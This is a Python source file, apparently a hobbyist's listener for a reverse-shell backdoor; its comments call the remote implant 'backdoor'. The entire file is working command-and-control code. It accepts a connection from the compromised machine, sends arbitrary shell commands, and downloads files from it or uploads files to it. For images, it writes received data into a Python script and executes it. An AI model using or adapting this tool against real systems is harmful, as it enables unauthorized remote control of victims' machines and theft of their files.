from json.decoder import JSONDecodeError
import socket
import argparse
import json
import os
import subprocess


def parser():  # KNOW IT'S PURPOSE

    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", dest="ip_address",
                        help="Use it to input host ip address")
    parser.add_argument("-p", "--port", dest="port_number",
                        help="Use it to set host port")
    options = parser.parse_args()
    return options.ip_address, options.port_number


def connection():

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # AF_INET refers to the address-family ipv4. The SOCK_STREAM means connection-oriented TCP protocol.
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ip_address, port_number = parser()
    port = int(port_number)
    # Bind the socket to the address and port
    listener.bind((ip_address, port))
    # Place the socket into the listening state, able to pend backlog outstanding connection requests
    listener.listen(0)
    print("#WAITING FOR CONNECTION")
    # Return a client socket (with peer address information)
    connection, ip = listener.accept()
    print("!CONNECTION ESTABLISHED FROM!", ip)
    return connection


def json_send_data(data):
    # converts data into json serializable data usually data has "at beginning and ending for marking".
    converted_data = json.dumps(data)
    command = converted_data.encode('utf-8')  # convert json string to bytes
    connection.send(command)  # Send the data through the socket


def json_recieve_data():
    process_data = ""
    final_data = ""
    while True:
        data = connection.recv(1024)  # recieve data as bytes
        main_data = data.decode('utf-8')  # convert into json serialized data
        try:
            # LOGIC: First add data decode to an empty string
            pre_final_data = process_data + main_data
            # Second add the data of first step to final data which goes on continuously because
            final_data = final_data+pre_final_data
            # as soon as error is raised because json loads method couldn't unserialize because data is not complete it jumps to exception block and
            converted_data = json.loads(final_data)
            # loop continues due to continue statement and complete data is filled.
            return converted_data
        except(JSONDecodeError):
            continue

# LOGIC different from other but can be used not necessary that will work same json_recieve_data
# function would work for all above will use till no error occurs for future proof we have differnt
# function too which will work kept it because first developed this and then that because wasn't
# able to make latter first time so discovered this one.


def json_recieve_data_for_download():  # MAIN LOGIC: First to declare three empty strings then recieve data and to decode it to json
    # serializable data developed json serializable data in such a way in backdoor that it will give
    # starting b' which is default which means bytes end is modified from '" to '"(space here) would
    # find it in if statement later REASON was """""""" would not accept four " consecutively so a space
    # could fix it so did.
    second_one_third_data = ""
    first_one_third_data = ""
    third_one_third_data = ""
    while True:
        data = connection.recv(1024)
        # data here after is in form of string it is having bytes like appearance because data send
        main_data = data.decode('utf-8')
        # was bytes of file to be downloaded
        try:
            if main_data.startswith(""""b'""") == True & main_data.endswith("""'" """) == True:
                return main_data
            if main_data.startswith(""""b'""") == True:
                first_one_third_data = first_one_third_data+main_data
                continue
            elif main_data.endswith("""'" """) == True:
                third_one_third_data = third_one_third_data + \
                    main_data  # data collected first which started with b' and second data have middle
                # neither start no end so no "/'/b needed third data is end which ends with
                #  '" after that all data are appended to final data continuously through while
                # loop and continue statement and as soon as data is complete it return statement
                # ends the loop and function and send final_data to place where functonn call was
                # recieved.
                final_data = first_one_third_data+second_one_third_data+third_one_third_data
                if final_data.startswith(""""b'""") == True & main_data.endswith("""'" """) == True:
                    return final_data
                else:
                    continue
            elif main_data.startswith(""""b'""") == False & main_data.endswith("""'" """) == False:
                second_one_third_data = second_one_third_data + main_data
                continue
        except(JSONDecodeError):
            continue


def send_file(file_name):

    # opens the file to upload read it in binary form send bytes later
    with open(file_name, 'rb') as file_to_be_downloaded:
        # to the place where it was called and later transfers data to desired ip.
        sucessfully_read = file_to_be_downloaded.read()
        return sucessfully_read


def recieved_file(name_of_file_to_be_downloaded, content):
    # LOGIC: If file has jpg extension it will follow this process or either one.
    if name_of_file_to_be_downloaded.endswith('jpg'):
        # first the name of the file to be downloaded such as r.jpg is seperated as
        # r and jpg .
        name_list = name_of_file_to_be_downloaded.split('.')
        first_name = name_list[0]
        image_creator = "\nwith open('"+first_name + \
            ".jpg','wb') as image:\n\timage.write(image_content)\n\timage.close()"
        # Second step creates a file named random_images_name.py in which
        with open("random_images_name.py", 'wb') as img:
            # first this is typed in which is used to convert the bytes which are in string form into
            img.write(b'image_content=b')
            # bytes form without changing the data because we need that data and if we encode it
            # it doesn't leads to image formation because as we encode it /xxf gets converted to //xxf
            # which isn't the needed data
        with open("random_images_name.py", 'a') as img:
            # Third step the content we recieved that is our bytes in string form get's converted to image
            img.write(content)
            # and is stored in image_content variable
        with open("random_images_name.py", 'a') as img:
            # Fourth step is that the line which writes the image content into the file which we downloaded
            img.write(image_creator)
            # along with it's name which we extracted earlier(first_name).
            # Fifth step makes the python file run
        subprocess.call("python3 random_images_name.py", shell=True)
        # which creates the file we needed due to the image_created variable content.
        # removes the additional .py file created during the process.
        os.remove("random_images_name.py")
        return print("IMAGE SUCCESSFULLY DOWNLOADED")
    else:
        with open(name_of_file_to_be_downloaded, 'w') as file:
            downloaded_file = file.write(content)
            return downloaded_file  # End the function


def command_execution():
    try:
        if json_recieve_data == "EXCEPTION":
            print("EXCEPTION TOOK PLACE.\nWATCH YOUR COMMANDS")
    except(Exception):
        pass
    while True:
        user_command = input("\n>>>")  # Recieves command entered by us
        # Spilt it into a list so that necessary actions can be
        data_to_list = user_command.split(" ")
        # done later.
        try:  # try and except statement so that backdoor doesn't shut away later on under any exception.
            if data_to_list[0] == "exit":
                json_send_data(user_command)
                connection.close()
                exit()  # if command is exit ,exit the listener and quit.
            elif data_to_list[0] == "download":
                json_send_data(user_command)
                if data_to_list[1].endswith('.jpg') == True:
                    # On reciving a command for image to
                    data_recieved = json_recieve_data_for_download()
                    # download first we remove the space we created earlier.
                    final_data = data_recieved.strip()
                    # Second we deserialize the string to normal string
                    final_string = json.loads(final_data)
                    # Removing  b so that we can add it later
                    final_stripped_data = final_string.lstrip(' b')
                    # in python script to convert the string into byte for further process.
                    # send further data to function which will
                    recieved_file(data_to_list[1], final_stripped_data)
                    # do further task.
                else:
                    data_recieved = json_recieve_data()
                    recieved_file(data_to_list[1], data_recieved)
            elif data_to_list[0] == "upload":
                # On reciving the command for download first we send command upload
                json_send_data(user_command)
                # to backdoor so that it knows and get ready up for download process.
                # the name of file to be uploaded is send to system.
                result = send_file(data_to_list[1])
                if data_to_list[1].endswith('.jpg') == True:
                    # If an image file is to be downloaded first we convert it into json de
                    string = str(result)
                    # serialized data and then add a (space to it) same process for download but in this case
                    # backdoor is downloading and not us.
                    json_string = json.dumps(string)
                    final_string = json_string + " "
                    final_data = bytes(final_string, 'utf-8')
                    # Encoding the data recieved and sending it as bytes.
                    connection.send(final_data)
                    print("UPLOAD SUCCESSFUL")
                else:
                    final_result = result.decode('utf-8')
                    json_send_data(final_result)
                    print("UPLOAD SUCCESSFUL")
            else:
                # If either no condition is found data is send normally.
                json_send_data(user_command)
                data_recieved = json_recieve_data()
                print(data_recieved)
        except(Exception):
            print("EXCEPTION TOOK PLACE.\nWATCH YOUR COMMANDS")


connection = connection()
command_execution()
# To start execution
